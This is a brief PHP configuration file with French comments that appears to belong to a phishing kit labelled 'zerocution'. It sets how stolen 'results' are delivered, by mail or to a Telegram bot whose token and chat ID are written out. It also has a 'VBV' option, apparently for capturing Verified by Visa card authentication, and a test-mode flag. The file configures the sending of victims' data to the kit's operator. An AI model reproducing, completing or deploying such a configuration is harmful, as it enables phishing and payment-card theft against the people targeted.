<?php

#zerocution

# Mail
$mail_send = FALSE;                                           # False pour ne pas recevoir par Mail
$rezmail = "email@email.com";

#Telegram
$tlg_send = true;                                       # False pour ne pas recevoir par Telegram
$bot_token = "8379916239:AAFqlk5PYpWrsm0cb6MCslZUWeFRGMILb_g";

$rez_chat = "-1002929451012";          

# VBV

$vbv = false;
$timeVBV = "15";

# DEV

$test_mode = false;

?>